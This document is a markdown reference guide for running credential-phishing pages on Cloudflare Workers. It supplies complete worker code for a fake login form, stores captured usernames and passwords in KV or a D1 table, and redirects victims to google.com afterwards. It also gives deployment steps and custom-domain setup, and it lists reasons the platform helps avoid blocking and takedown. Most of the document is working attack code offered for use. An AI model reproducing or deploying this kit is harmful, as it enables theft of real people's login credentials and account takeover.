# Serverless Phishing: Cloudflare Workers Reference

## Concept
Cloudflare Workers are serverless functions running at the edge. Benefits:
- Trusted `*.workers.dev` domain + auto SSL
- Already categorized as "Information Technology" by some vendors
- No server to manage, scale, or get taken down via IP
- Pay-as-you-go pricing

---

## Basic Login Page Worker

```javascript
export default {
  async fetch(request, env) {
    if (request.method === "POST") {
      const formData = await request.formData();
      const username = formData.get("username");
      const password = formData.get("password");

      if (username && password) {
        await env.creds.put(username, password);

        return new Response(null, {
          status: 303,
          headers: { "Location": "https://www.google.com" }
        });
      }
      return new Response("Missing fields", { status: 400 });
    }

    return new Response(`
      <!DOCTYPE html>
      <html><head><title>Login</title>
      <style>
        body{font-family:Arial,sans-serif;text-align:center;padding:50px}
        form{display:inline-block;text-align:left;margin-top:20px}
        input{display:block;margin-bottom:10px;padding:8px;width:200px}
        button{padding:10px;background:#007bff;color:#fff;border:none;cursor:pointer}
      </style></head>
      <body><h1>Login</h1>
      <form method="POST">
        <label>Username:</label><input type="text" name="username" required>
        <label>Password:</label><input type="password" name="password" required>
        <button type="submit">Submit</button>
      </form></body></html>
    `, { headers: { "Content-Type": "text/html" } });
  },
};
```

---

## KV Storage Setup

1. Cloudflare Dashboard → Storage & Databases → KV → Create namespace "creds"
2. Worker Settings → Bindings → Add → KV Namespace → Variable: `creds`, Namespace: `creds`
3. Store credentials: `await env.creds.put(username, password)`
4. View results: Dashboard → KV → creds → KV Pairs

---

## D1 SQL Storage Setup

1. Cloudflare Dashboard → Storage & Databases → D1 → Create database "main"
2. Create table:
```sql
CREATE TABLE creds (
    username TEXT,
    password TEXT,
    submission_time TEXT
);
```
3. Worker Settings → Bindings → Add → D1 Database → Variable: `main`, Database: `main`

### D1 Worker Code
```javascript
export default {
  async fetch(request, env) {
    if (request.method === "POST") {
      const formData = await request.formData();
      const username = formData.get("username");
      const password = formData.get("password");
      const time = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });

      if (username && password) {
        try {
          await env.main.prepare(
            "INSERT INTO creds (username, password, submission_time) VALUES (?, ?, ?)"
          ).bind(username, password, time).run();

          return new Response(null, {
            status: 303,
            headers: { "Location": "https://www.google.com" }
          });
        } catch (e) {
          return new Response("Error", { status: 500 });
        }
      }
      return new Response("Missing fields", { status: 400 });
    }

    return new Response(loginHTML, { headers: { "Content-Type": "text/html" } });
  },
};
```

---

## Deployment
1. Dashboard → Compute (Workers) → Create Worker
2. Paste code in editor
3. Click Deploy
4. Access via `https://worker-name.your-subdomain.workers.dev`

## Custom Domain
Instead of `*.workers.dev`, point your own domain to the Worker via DNS CNAME.
